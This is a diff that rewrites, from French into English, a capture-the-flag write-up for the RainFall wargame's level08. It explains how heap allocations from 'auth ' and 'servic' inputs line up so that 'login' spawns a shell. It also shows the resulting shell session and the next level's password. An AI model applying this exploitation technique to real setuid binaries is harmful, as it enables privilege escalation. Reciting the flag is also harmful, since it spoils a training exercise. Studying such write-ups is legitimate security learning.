@@ -1,17 +1,52 @@
-Pour lancer un shell il faut ne entrer dans les jumps a partir de *main+357.
-Pour ce faire il faut entrer "login" dans le fgets et remplir les conditions suivantes:
-_Pouvoir acceder a la variables "auth" (0x8049aac), sinon le programme segfault
-_Le pointeur contenu dans auth doit etre une adresse et cette adresse+0x20 doit etre accessible et doit contenir une valeur autre que 0x0
+# level08
 
-======================================================================================
+The program waits for input in an infinite loop, and print some variables:
 
-Step1: "auth "
-Donne a la valeur de la variable "auth" l adresse du premier malloc(4), on a donc deja allouer 4 bytes apres auth sur 32, il y en a 2 de vide, mais ce n est pas important, on pourrait les remplir a la suite de "auth ".
-Ce qui est important c est que sur la heap on avance pour la prochaine allocation qui se fera a la suite de celle-ci.
-Malloc reserve 0x10(16) bytes a chaque allocation qui est en dessous de 0x10(16) bytes, du coup, la prochaine allocation se fera 0x10(16) bytes plus loin que cette adresse.
+```bash
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+dsa
+(nil), (nil) 
+dasd
+(nil), (nil) 
+das
+(nil), (nil) 
+```
 
-Step2: "service LeChevalCGenial"
-le deuxieme malloc va se faire a la suite de l autre, celui-c est sous la forme d un strdup(), du coup on peut lui donner une valeur allant jusqu a 128 bytes, c'est la valeur max du fgets, nous avons juste besoin de 16 (32-16) bytes
+By looking at the code, we can se that the program compare the input string with: "auth ", "reset", "servic" and "login".
 
-Step3: "login"
-Nous remplissons maintenant les conditions pour arriver a *main+401 qui n'est autre que la commande system("/bin/sh") qui nous ouvre un "beau" shell
+In "auth " if, the program malloc the <auth> variable with 4 bytes. It checks if the input string is lower that 34, and copy it in the new malloc'ed buffer.
+
+In "servic" if, the program malloc the <service> variable and copy the input string from the 7th bytes.
+
+In "login" if, the program checks if the byte at is <auth> + 20 is different of 0. It opens a shell if true.
+
+When passing "auth ", we can see that the address begin at 0x804a008:
+
+```bash
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+```
+
+We need so to overwrite the first byte at address 0x804a028.
+
+When passing "servic", we can see that the second address begin at 0x804a018. Malloc allocate a minimum of 16 bytes.
+
+So to override the byte, we simlpy need to put one byte after "servic".
+
+We try to exploit the program:
+
+```bash
+servic 
+0x804a008, 0x804a018 
+service
+0x804a008, 0x804a028 
+login
+$ whoami
+level9
+$ cd /home/user/level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
